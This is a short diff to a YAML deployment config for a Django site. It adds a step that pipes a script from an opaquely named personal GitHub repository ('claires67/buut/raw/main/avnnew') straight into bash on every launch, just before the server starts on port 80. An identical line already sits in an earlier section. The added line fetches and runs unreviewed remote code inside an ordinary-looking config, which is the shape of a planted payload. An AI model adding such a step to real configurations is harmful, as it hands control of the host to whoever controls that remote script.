@@ -11,4 +11,5 @@ deployments:
       - curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
     launch_steps:
       - cd ~/code/mysite
+      - curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
       - python manage.py runserver 0.0.0.0:80
